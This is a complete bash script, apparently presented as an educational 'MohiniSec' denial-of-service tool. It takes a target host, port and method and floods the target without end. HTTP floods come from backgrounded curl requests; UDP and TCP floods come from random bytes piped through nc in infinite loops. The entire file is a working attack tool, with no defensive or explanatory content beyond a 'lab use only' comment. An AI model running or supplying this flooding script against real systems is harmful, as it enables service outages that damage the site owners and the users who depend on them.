#!/bin/bash
# MohiniSec - Multi-Method DoS Tool (Educational / Lab Use Only)
# Author: Your Name
# Project: Cybersecurity Demonstration Tool

banner() {
    echo "========================================"
    echo "          MohiniSec - DoS Tool"
    echo "   For Cybersecurity Projects & Labs"
    echo "========================================"
}

usage() {
    echo "Usage: $0 <target> <port> <method>"
    echo "Methods:"
    echo "   http  - HTTP Flood"
    echo "   udp   - UDP Flood"
    echo "   tcp   - TCP Flood"
    exit 1
}

# Check arguments
if [ "$#" -ne 3 ]; then
    usage
fi

target=$1
port=$2
method=$3

banner
echo "[*] Target: $target"
echo "[*] Port:   $port"
echo "[*] Method: $method"
echo "[*] Press CTRL+C to stop."

# HTTP Flood
http_flood() {
    while true; do
        curl -s "http://$target:$port/?$(date +%s%N)" > /dev/null &
    done
}

# UDP Flood
udp_flood() {
    while true; do
        head -c 1024 </dev/urandom | nc -u -w0 $target $port
    done
}

# TCP Flood
tcp_flood() {
    while true; do
        head -c 1024 </dev/urandom | nc $target $port
    done
}

# Select attack method
case $method in
    http)
        http_flood
        ;;
    udp)
        udp_flood
        ;;
    tcp)
        tcp_flood
        ;;
    *)
        usage
        ;;
esac

